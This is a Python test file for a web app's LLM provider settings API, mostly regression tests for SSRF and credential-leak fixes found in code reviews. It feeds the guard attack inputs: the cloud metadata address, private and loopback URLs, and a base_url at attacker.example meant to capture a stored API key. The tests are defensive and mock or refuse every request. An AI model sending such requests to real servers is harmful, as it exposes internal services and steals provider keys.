"""LLM provider settings endpoints tests."""


def test_get_default_llm(client):
    llm = client.get("/settings/llm").json()
    assert llm["provider"] in ["openrouter", "openai_compatible", "ollama", "none"]
    assert "has_api_key" in llm
    assert "api_key" not in llm  # key never exposed
    assert llm["topup_mode"] in ["manual", "auto"]


def test_admin_update_llm(client):
    r = client.put("/settings/llm", json={
        "provider": "ollama",
        "base_url": "http://192.168.1.50:11434",
        "model": "llama3.2",
        "image_model": "",
        "video_model": "",
        "monthly_limit": 50.0,
        "topup_mode": "auto",
        "api_key": "secret123",
    })
    assert r.status_code == 200
    data = r.json()
    assert data["provider"] == "ollama"
    assert data["base_url"] == "http://192.168.1.50:11434"
    assert data["monthly_limit"] == 50.0
    assert data["topup_mode"] == "auto"
    assert data["has_api_key"] is True
    assert "api_key" not in data


def test_non_admin_cannot_update_llm(make_operator, anon_client):
    make_operator("llm-op@socialpilot.local", "password123", role="operator")
    anon_client.post("/auth/login", json={"email": "llm-op@socialpilot.local", "password": "password123"})
    body = {"provider": "none", "base_url": "", "model": "", "image_model": "",
            "video_model": "", "monthly_limit": None, "topup_mode": "manual"}
    assert anon_client.put("/settings/llm", json=body).status_code == 403


def test_llm_test_none_provider(client):
    r = client.post("/settings/llm/test", json={"provider": "none", "base_url": "", "api_key": None})
    assert r.status_code == 200
    assert r.json()["ok"] is False


def test_models_none_provider(client):
    r = client.post("/settings/llm/models", json={"provider": "none", "base_url": "", "api_key": None})
    assert r.status_code == 200
    assert r.json()["models"] == []


def test_commercial_name_stripping():
    from app.llm import _commercial_name

    assert _commercial_name("Google: Nano Banana (Gemini 2.5 Flash Image)") == "Nano Banana"
    assert _commercial_name("Black Forest Labs: FLUX.2 Pro") == "FLUX.2 Pro"
    assert _commercial_name("") == ""


# ---------------------------------------------------------------------------------------------------
# The base_url guard (a second review's finding: `POST /settings/llm/test` with base_url pointing at the
# cloud metadata service made this server fetch it). Nothing here reaches the network: the guard refuses
# before any connection, and the refusals are the point.
# ---------------------------------------------------------------------------------------------------

def test_test_connection_refuses_a_link_local_base_url():
    from app.llm import test_connection

    ok, detail = test_connection("openai_compatible", "http://169.254.169.254", None)
    assert ok is False and "refusée" in detail, detail


def test_test_connection_refuses_a_private_base_url():
    from app.llm import test_connection

    for url in ("http://10.0.0.5:8080", "https://192.168.50.1/v1", "http://127.0.0.1:8200"):
        ok, detail = test_connection("openai_compatible", url, None)
        assert ok is False, f"{url} was not refused: {detail}"


def test_the_loopback_allowance_is_about_the_values_not_the_field():
    """The allowance is decided by the provider mode and the address, never by which field was filled in.

    This case asserts the guard's own side of it (that an address reaching the fetch is refused unless the
    rule says otherwise); the rule itself, with its truth table, is
    `test_the_allowance_follows_a_declared_deployment_fact`, and the routes are covered by
    `test_the_settings_routes_allow_only_a_declared_local_endpoint`. Nothing here consults the stored row:
    a stored setting grants nothing, which is the line that keeps this out of SSRF territory.
    """
    from app.net_guard import MediaFetchRefused, assert_fetchable

    assert_fetchable("http://127.0.0.1:11434", allow_loopback=True)
    try:
        assert_fetchable("http://127.0.0.1:11434", allow_loopback=False)
    except MediaFetchRefused:
        pass
    else:  # pragma: no cover — the assertion below explains the failure if this happens
        raise AssertionError("a request-supplied loopback base_url was allowed")


def test_list_models_refuses_the_same_addresses():
    import pytest

    from app.llm import list_models

    with pytest.raises(RuntimeError) as err:
        list_models("openai_compatible", "http://169.254.169.254", None)
    assert "refusée" in str(err.value)


def test_the_provider_response_cap_applies_to_data_urls_and_b64_json(monkeypatch):
    """The https path caps while streaming; these two arrive inside the response, so they are measured
    before decoding — otherwise one huge base64 string bypasses the cap the [egress] policy names.

    The first version of this case could not reach the branch it claimed to test: base64 of
    (cap + 1) bytes is shorter than the pre-decode threshold (cap * 4/3 + 8), so it was refused by the
    *post*-decode check and the 26 MB was decoded anyway — and both branches share the word "cap", so
    deleting the pre-decode measurement would have kept the test green. The cap is patched down so the
    measurement branch is the one that fires, and the message is asserted to be that branch.
    """
    import base64

    import pytest

    from app import llm as llm_module

    monkeypatch.setattr(llm_module, "MAX_MEDIA_BYTES", 64)
    assert llm_module._b64_limited(base64.b64encode(b"x" * 10).decode(), "test") == b"x" * 10

    # 64 * 4 // 3 + 8 = 93: strictly longer than this has to be refused *before* decoding.
    over = "A" * (64 * 4 // 3 + 9)
    with pytest.raises(RuntimeError) as err:
        llm_module._b64_limited(over, "data: URL")
    assert "before decoding" in str(err.value), (
        f"the pre-decode measurement did not fire: {err.value}")

    # and a payload under that threshold but decoding to more than the cap is still caught afterwards
    just_over = base64.b64encode(b"x" * 65).decode()
    with pytest.raises(RuntimeError) as err:
        llm_module._b64_limited(just_over, "b64_json field")
    assert "cap" in str(err.value)

    with pytest.raises(RuntimeError) as err:
        llm_module._b64_limited("!!!not base64!!!", "b64_json field")
    assert "not valid base64" in str(err.value)


def test_the_settings_routes_allow_only_a_declared_local_endpoint(client, monkeypatch):
    """What the routes allow, and the SSRF line they hold.

    A stored loopback address is **not** enough, because the stored row is written through this same API by
    the same admin the guard is aimed at: save a loopback URL and you have put every loopback port of the
    host within reach of a model listing (a review measured exactly that). What is allowed is the endpoint
    we ship for the local provider, or one the deployment declared in its environment. Nothing here reaches
    the network — the ports used are closed by every convention there is.
    """
    import types

    from app import config as config_module

    r = client.put("/settings/llm", json={
        "provider": "ollama", "base_url": "http://127.0.0.1:9", "model": "llama3.2",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-ROUTE-KEY-not-a-real-secret",
    })
    assert r.status_code == 200

    # 1. a request that names nothing resolves to the endpoint we ship for ollama (localhost:11434) → the
    #    allowance applies, so the answer is a socket error, not a guard refusal
    r = client.post("/settings/llm/test", json={"provider": "ollama", "base_url": "", "api_key": ""})
    assert r.status_code == 200
    assert "refusée" not in r.json()["detail"], r.json()["detail"]

    # 2. the stored loopback address, posted back → refused: a stored setting is not a deployment fact
    r = client.post("/settings/llm/test",
                    json={"provider": "ollama", "base_url": "http://127.0.0.1:9", "api_key": ""})
    assert r.status_code == 200
    assert "refusée" in r.json()["detail"], r.json()["detail"]

    # 3. the same address, once the deployment declares it in the environment
    monkeypatch.setattr(config_module, "get_settings",
                        lambda: types.SimpleNamespace(local_llm_url="http://127.0.0.1:9"))
    r = client.post("/settings/llm/test",
                    json={"provider": "ollama", "base_url": "http://127.0.0.1:9", "api_key": ""})
    assert r.status_code == 200
    assert "refusée" not in r.json()["detail"], r.json()["detail"]

    # 4. and another loopback port the deployment did NOT declare is still refused
    r = client.post("/settings/llm/test",
                    json={"provider": "ollama", "base_url": "http://127.0.0.1:8", "api_key": ""})
    assert r.status_code == 200
    assert "refusée" in r.json()["detail"], r.json()["detail"]


def test_the_allowance_follows_a_declared_deployment_fact():
    """The rule has one statement, and this is its truth table.

    Four versions of it were written and a review read each one: deciding from the request field,
    comparing against the stored row (twice, in two spellings), and finally allowing whatever the stored
    row says — which is the SSRF the guard exists to prevent, because that row is written through the API
    by the same admin the guard is aimed at. What holds: the allowance follows a *deployment* fact
    (`SP_LOCAL_LLM_URL`, from the environment) or the endpoint we ship for that provider.
    """
    from app.llm import DEFAULT_BASE_URLS, local_endpoint_allowed

    shipped = DEFAULT_BASE_URLS["ollama"]                 # http://localhost:11434
    declared = "http://127.0.0.1:11500"                   # what a deployment may declare in its .env
    # the endpoint we ship for the local provider
    assert local_endpoint_allowed("ollama", shipped) is True
    assert local_endpoint_allowed("ollama", shipped + "/") is True
    # the endpoint the deployment declared
    assert local_endpoint_allowed("ollama", declared, declared) is True
    # a stored setting is not a deployment fact — this is the SSRF line
    assert local_endpoint_allowed("ollama", "http://127.0.0.1:9") is False
    assert local_endpoint_allowed("ollama", "http://127.0.0.1:9", declared) is False
    assert local_endpoint_allowed("ollama", "http://127.0.0.1:11434") is False
    assert local_endpoint_allowed("ollama", "http://localhost:9999") is False
    # and never for another provider, however it is spelled
    assert local_endpoint_allowed("openrouter", shipped, declared) is False
    assert local_endpoint_allowed("openai_compatible", shipped, declared) is False
    # nothing to decide on
    assert local_endpoint_allowed("ollama", "", declared) is False
    assert local_endpoint_allowed("ollama", None, declared) is False


def test_the_stored_api_key_never_follows_a_request_chosen_url(client, monkeypatch):
    """The stored key belongs to the stored endpoint.

    `POST /settings/llm/models {"base_url": "https://attacker.example/v1"}` used to have this server send
    the instance's saved provider key to that address — proved by a review with the app's own test client.
    A request that names its own URL now gets only the key it supplies.
    """
    from app import net_guard

    seen: list[dict] = []

    class FakeResponse:
        status_code = 200

        @staticmethod
        def json():
            return {"data": []}

        @staticmethod
        def raise_for_status():
            return None

    def fake_request(method, url, *, headers=None, json_body=None, timeout=20.0,
                     allow_loopback=False):
        seen.append({"url": url, "headers": dict(headers or {})})
        return FakeResponse()

    r = client.put("/settings/llm", json={
        "provider": "openrouter", "base_url": "https://openrouter.ai/api/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-STORED-KEY-must-not-travel-000",
    })
    assert r.status_code == 200

    monkeypatch.setattr(net_guard, "guarded_request", fake_request)
    r = client.post("/settings/llm/models?modality=text",
                    json={"provider": "openrouter", "base_url": "https://attacker.example/v1",
                          "api_key": ""})
    assert r.status_code == 200
    assert seen and "attacker.example" in seen[-1]["url"]
    assert not any("must-not-travel" in str(v) for v in seen[-1]["headers"].values()), \
        f"the stored key was sent to a request-chosen URL: {seen[-1]!r}"

    # and when the request names no address, the stored key is still used (the normal path)
    seen.clear()
    r = client.post("/settings/llm/models?modality=text",
                    json={"provider": "openrouter", "base_url": "", "api_key": ""})
    assert r.status_code == 200
    assert seen and "attacker.example" not in seen[-1]["url"]
    assert any("must-not-travel" in str(v) for v in seen[-1]["headers"].values()), \
        "the stored key must still follow the stored endpoint"

    # The shape the sixth review found: name no base_url but a DIFFERENT provider whose shipped default is
    # non-empty, and the resolved URL becomes that provider's default — a third endpoint the stored key does
    # not belong to. (It has to be a provider with a shipped default: `openai_compatible` has none, so that
    # one falls back to the stored URL and the key is right to go there, which the case above covers.)
    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://kept.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-STORED-KEY-must-not-travel-001",
    })
    assert r.status_code == 200
    seen.clear()
    r = client.post("/settings/llm/models?modality=text",
                    json={"provider": "openrouter", "base_url": "", "api_key": ""})
    assert r.status_code == 200
    assert seen, "the guard should have been called"
    assert not any("must-not-travel" in str(v) for v in seen[-1]["headers"].values()), \
        f"the stored key followed a provider switch to a third endpoint: {seen[-1]!r}"
    assert "openrouter.ai" in seen[-1]["url"], f"unexpected endpoint: {seen[-1]['url']}"


def test_a_redirect_is_refused_rather_than_reported_as_connected():
    """A 3xx must not come back as a successful connection.

    follow_redirects=False alone is not enough: test_connection treats any status under 400 as success, so
    an address that redirects answered "Connecté (301)" on the connectivity check while the model listing
    failed on the same configuration. The guard refuses the redirect, so both routes give one answer.

    A local http server is enough to prove it — the loopback allowance is exactly how a saved local
    provider is reached, and nothing here leaves the machine.
    """
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer

    import pytest

    from app.net_guard import MediaFetchRefused, guarded_request

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802 — the stdlib's spelling
            self.send_response(302)
            self.send_header("Location", "https://example.com/elsewhere")
            self.end_headers()

        def log_message(self, *args):  # keep the test output clean
            return

    server = HTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        url = f"http://127.0.0.1:{server.server_port}/v1/models"
        with pytest.raises(MediaFetchRefused) as err:
            guarded_request("GET", url, allow_loopback=True)
        assert "redirect" in str(err.value)
    finally:
        server.shutdown()
        server.server_close()


def test_a_stored_key_cannot_be_walked_to_a_new_endpoint(client):
    """The two-request path a review found, closed at the first request.

    PUT a new base_url with no api_key (the old key was kept) and the stored key was then attached to
    whatever address that put in the row. A key belongs to one endpoint, so changing the endpoint asks for
    the key again — refused rather than cleared, so nothing disappears without a word.
    """
    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://kept-2.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-STORED-KEY-must-not-travel-002",
    })
    assert r.status_code == 200

    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://moved.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "",
    })
    assert r.status_code == 400, r.json()
    assert "clé API" in r.json()["detail"]

    # the same PUT leaving the endpoint alone is fine, and keeps the key
    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://kept-2.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "",
    })
    assert r.status_code == 200


def test_a_whitespace_only_api_key_is_not_a_key(client):
    """A review measured this: PUT with `"api_key": " "` read as a key, so it moved the stored endpoint and
    replaced the stored key with an empty one in the same request. The stored credential was destroyed and
    the address walked — both halves of what the rule above exists to prevent. A whitespace-only value is
    not a key, on both sides of the comparison."""
    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://kept-3.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-STORED-KEY-must-not-travel-003",
    })
    assert r.status_code == 200
    assert client.get("/settings/llm").json()["has_api_key"] is True

    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://moved-3.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": " ",
    })
    assert r.status_code == 400, r.json()
    # the stored key is still there and the endpoint did not move
    assert client.get("/settings/llm").json()["has_api_key"] is True
    assert client.get("/settings/llm").json()["base_url"] == "https://kept-3.example/v1"


def test_a_whitespace_only_key_is_not_a_key_on_every_route(client, monkeypatch):
    """The rule is the same wherever a key arrives: /test and /models strip it too, so a blank value cannot
    read as a key on one route while it is refused on another."""
    from app import net_guard

    sent: list[dict] = []

    class FakeResponse:
        status_code = 200

        @staticmethod
        def json():
            return {"data": []}

        @staticmethod
        def raise_for_status():
            return None

    def fake_request(method, url, *, headers=None, json_body=None, timeout=20.0,
                     allow_loopback=False):
        sent.append({"url": url, "headers": dict(headers or {})})
        return FakeResponse()

    r = client.put("/settings/llm", json={
        "provider": "openai_compatible", "base_url": "https://kept-4.example/v1", "model": "",
        "image_model": "", "video_model": "", "monthly_limit": 50.0, "topup_mode": "manual",
        "api_key": "TEST-STORED-KEY-must-not-travel-004",
    })
    assert r.status_code == 200
    monkeypatch.setattr(net_guard, "guarded_request", fake_request)

    r = client.post("/settings/llm/models?modality=text",
                    json={"provider": "openai_compatible", "base_url": "", "api_key": " "})
    assert r.status_code == 200
    # the stored key follows the stored endpoint (that is the rule), so it is sent — and what matters here is
    # that a blank *supplied* key was not treated as one: no whitespace-only header value is produced.
    assert all(str(v).strip() != "Bearer" for v in sent[-1]["headers"].values()), sent[-1]

    r = client.post("/settings/llm/test",
                    json={"provider": "openai_compatible", "base_url": "https://kept-4.example/v1",
                          "api_key": " "})
    assert r.status_code == 200
    # The /test half has to be able to fail: assert on what was SENT, not on a status the fake can only
    # return as 200. /test uses the key the request supplies and never the stored one (it is the caller
    # testing an address, not the saved configuration), so a blank value must produce no Authorization
    # header at all — remove the strip and this records "Bearer  " instead.
    assert sent, "the guarded request should have been captured"
    assert "Authorization" not in sent[-1]["headers"], \
        f"a blank supplied key must be treated as absent, not as a key: {sent[-1]['headers']!r}"
